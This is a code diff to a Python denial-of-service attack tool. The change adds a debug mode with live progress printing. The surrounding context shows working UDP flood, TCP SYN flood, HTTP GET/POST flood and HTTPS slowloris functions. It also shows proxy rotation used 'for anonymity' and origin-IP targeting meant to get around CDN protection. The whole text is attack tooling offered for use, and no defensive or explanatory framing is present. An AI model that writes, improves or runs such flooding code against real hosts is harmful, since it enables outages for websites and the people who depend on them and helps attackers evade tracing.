@@ -12,6 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxy_list = []
 proxy_index = 0
 proxy_lock = threading.Lock()
+debug_mode = False  # Debug mode for live output
 
 def load_proxies():
     """Load proxies from proxies.txt or manual input"""
@@ -60,6 +61,8 @@ def get_next_proxy():
     with proxy_lock:
         proxy = proxy_list[proxy_index % len(proxy_list)]
         proxy_index += 1
+        if debug_mode:
+            print(f"[DEBUG] Using proxy: {proxy}")
         return proxy
 
 def format_proxy(proxy):
@@ -153,6 +156,8 @@ def udp_plain_flood(ip, port, duration, packet_size):
         while time.time() < end_time:
             sock.sendto(payload, (ip, port))
             packet_count += 1
+            if debug_mode and packet_count % 100 == 0:
+                print(f"[DEBUG] Sent {packet_count} packets to {ip}:{port}")
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
@@ -170,6 +175,8 @@ def udp_random_flood(ip, port, duration, packet_size):
             payload = random.randbytes(packet_size)
             sock.sendto(payload, (ip, port))
             packet_count += 1
+            if debug_mode and packet_count % 100 == 0:
+                print(f"[DEBUG] Sent {packet_count} random packets ({packet_size} bytes each)")
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
@@ -183,11 +190,15 @@ def udp_burst_flood(ip, port, duration, packet_size):
     packet_count = 0
     print(f"[🚀] UDP Burst Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
     try:
+        burst_count = 0
         while time.time() < end_time:
             for _ in range(100):  # Burst of 100 packets
                 payload = random.randbytes(packet_size)
                 sock.sendto(payload, (ip, port))
                 packet_count += 1
+            burst_count += 1
+            if debug_mode:
+                print(f"[DEBUG] Burst #{burst_count} completed - Total packets: {packet_count}")
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
@@ -241,6 +252,8 @@ def tcp_syn_flood_single(ip, port, duration):
             sock.connect_ex((ip, port))
             sock.close()
             packet_count += 1
+            if debug_mode and packet_count % 50 == 0:
+                print(f"[DEBUG] Sent {packet_count} SYN packets to {ip}:{port}")
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
@@ -250,12 +263,16 @@ def tcp_syn_flood_multi(ip, port, duration):
     end_time = time.time() + duration
     packet_count = [0]
     def syn_worker():
+        local_count = 0
         while time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect_ex((ip, port))
                 sock.close()
                 packet_count[0] += 1
+                local_count += 1
+                if debug_mode and local_count % 100 == 0:
+                    print(f"[DEBUG] Thread sent {local_count} SYN packets (Total: {packet_count[0]})")
             except:
                 pass
     print(f"[🚀] TCP SYN Flood (Multi) on {ip}:{port} | {duration}s...")
@@ -385,15 +402,24 @@ def http_get_flood(url, duration, use_origin=False):
                 # Set realistic headers
                 headers = get_realistic_headers(referer=url)
                 
+                if debug_mode and request_count % 10 == 0:
+                    print(f"[DEBUG] Request #{request_count} | User-Agent: {headers['User-Agent'][:50]}...")
+                
                 # Target origin IP if found, otherwise use URL
                 if target_ips and use_origin:
                     target_url = url.replace(domain, random.choice(target_ips))
                     headers['Host'] = domain  # Keep original domain in Host header
+                    if debug_mode and request_count % 10 == 0:
+                        print(f"[DEBUG] Targeting origin IP: {target_url}")
                 else:
                     target_url = url
                 
-                session.get(target_url, headers=headers, timeout=0.5)
-            except:
+                response = session.get(target_url, headers=headers, timeout=0.5)
+                if debug_mode and request_count % 10 == 0:
+                    print(f"[DEBUG] Response: {response.status_code} | Size: {len(response.content)} bytes")
+            except Exception as e:
+                if debug_mode and request_count % 10 == 0:
+                    print(f"[DEBUG] Request failed: {str(e)[:50]}")
                 pass
             request_count += 1
     except Exception as e:
@@ -436,15 +462,24 @@ def http_post_flood(url, duration, use_origin=False):
                 headers = get_realistic_headers(referer=url)
                 headers['Content-Type'] = 'application/x-www-form-urlencoded'
                 
+                if debug_mode and request_count % 10 == 0:
+                    print(f"[DEBUG] POST #{request_count} | Payload size: {len(str(payload))} bytes")
+                
                 # Target origin IP if found, otherwise use URL
                 if target_ips and use_origin:
                     target_url = url.replace(domain, random.choice(target_ips))
                     headers['Host'] = domain  # Keep original domain in Host header
+                    if debug_mode and request_count % 10 == 0:
+                        print(f"[DEBUG] Targeting origin IP: {target_url}")
                 else:
                     target_url = url
                 
-                session.post(target_url, data=payload, headers=headers, timeout=0.5)
-            except:
+                response = session.post(target_url, data=payload, headers=headers, timeout=0.5)
+                if debug_mode and request_count % 10 == 0:
+                    print(f"[DEBUG] Response: {response.status_code} | Size: {len(response.content)} bytes")
+            except Exception as e:
+                if debug_mode and request_count % 10 == 0:
+                    print(f"[DEBUG] Request failed: {str(e)[:50]}")
                 pass
             request_count += 1
     except Exception as e:
@@ -471,7 +506,11 @@ def https_slowloris(url, duration):
                 sock.send(b"GET / HTTP/1.1\r\nHost: " + hostname.encode() + b"\r\n")
                 sockets.append(sock)
                 connection_count += 1
-            except:
+                if debug_mode and connection_count % 10 == 0:
+                    print(f"[DEBUG] Opened {connection_count} slowloris connections to {hostname}:443")
+            except Exception as e:
+                if debug_mode:
+                    print(f"[DEBUG] Connection failed: {str(e)[:50]}")
                 pass
     except Exception as e:
         print(f"[❌] Error: {e}")
@@ -500,7 +539,14 @@ def validate_input(prompt, min_val, max_val, input_type=int):
             print("[❌] Invalid input! Numbers only.")
 
 def main():
+    global debug_mode
     print(ASCII_ART)
+    
+    # Enable debug mode
+    debug_input = input("Enable debug mode for live output? (y/n): ").strip().lower()
+    debug_mode = (debug_input == 'y')
+    if debug_mode:
+        print("[DEBUG] Debug mode enabled - showing live packet info")
     
     # Load proxies for anonymity
     use_proxy = input("Use proxies for anonymity? (y/n): ").strip().lower()
